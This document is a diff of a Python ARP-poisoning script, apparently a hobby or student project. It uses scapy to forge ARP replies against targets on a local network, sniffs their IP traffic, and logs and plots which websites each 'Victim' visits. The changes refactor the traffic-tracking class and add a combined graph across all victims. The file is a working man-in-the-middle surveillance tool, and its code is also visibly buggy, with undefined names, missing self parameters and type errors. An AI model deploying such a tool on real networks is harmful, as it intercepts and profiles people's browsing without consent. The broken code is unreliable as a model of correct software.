@@ -21,6 +21,7 @@ class Victim():
 				website.visit()
 				return	
 		self.websites.append(Website(domain))
+		return
 		
 	def make_Graph(self):
 		plt.figure()
@@ -29,6 +30,7 @@ class Victim():
 		plt.barh(domains, num_Visits) #plots a horizontal bar plot
 		plt.suptitle("Websites visited by "+ self.IPaddress)
 		plt.show()
+		return
 
 class Website():
 	def __init__(self, domain):
@@ -40,6 +42,7 @@ class Website():
 		
 	def visit():
 		visits += 1
+		return
 
 
 class PrePreAttack(object):	
@@ -83,8 +86,9 @@ class Attack(object):
 			arp2[ARP].hwdst = self.targets[i].MAC
 			arp2[ARP].pdst = self.targets[i].IP
 			sendp(arp2, iface = self.interface)
-			
-class track_traffic():
+		return
+
+class PostAttack():
 	def __init__(self, targets):
 		self.targets=targets
 	def track_packet(self, packet):
@@ -93,7 +97,7 @@ class track_traffic():
 		source = packet.src
 		dest   = packet.dst
 		
-		for i in range (0, len(targets)):
+		for i in range (0, len(self.targets)):
 			if self.targets[i].get_IP == src:
 				self.targets[i].visit(socket.gethostbyaddr(dest)) #what does .gethostbyaddr return if there is no "name" like google available?
 				return
@@ -101,7 +105,25 @@ class track_traffic():
 				self.targets[i].visit(socket.gethostbyaddr(src))
 				return
 	
-	return track_packet
+		return track_packet
+	def make_Graphs():
+		allWebsites = {}
+		for i in range(0, len(self.targets)):
+			self.targets[i].make_Graph()
+			for j in range(0, len(self.targets[i].websites)):
+				 if self.targets[i].websites[j].domain in allWebsites.keys():
+				 	allWebsites[self.targets[i].websites[j]] = self.target[i].websites[j].visits + allWebsites[self.targets[i].websites[j]] 
+				 else: 
+				 	allWebsites.update({self.targets[i].websites[j]: self.targets[i].websites[j].visits})
+		domains = list(allWebsites.keys())
+		numVisits = list(allWebsites.values())
+		plt.figure()
+		plt.barh(domains, numVisits)
+		plt.suptitle("Websites visited by " + len(self.targets) + " users.")
+		plt.show()
+		return
+		
+				
     
 
 
@@ -125,13 +147,12 @@ if __name__ == '__main__':
 			try:
 				Attacks(IP_router.src, targets, interface).send_Poison(my_Mac_Addr)
 				#sleep(3)
-				sniff(filter="ip", prn=track_traffic(targets).track_packet, count=10)
+				sniff(filter="ip", prn=PostAttack(targets).track_packet, count=10)
 			except Exception:
 				print("[Failed to send ARP-Poison]")
 	except KeyboardInterrupt:
 		print("[KeyBoard Interrupt]")
 		if targets != null:
 			print("[Making Graphs]")
-			for i in range(0, len(targets)):
-				 targets[i].make_Graph()
+			PostAttack(targets).make_Graphs()
 		print("[Shutting down]")
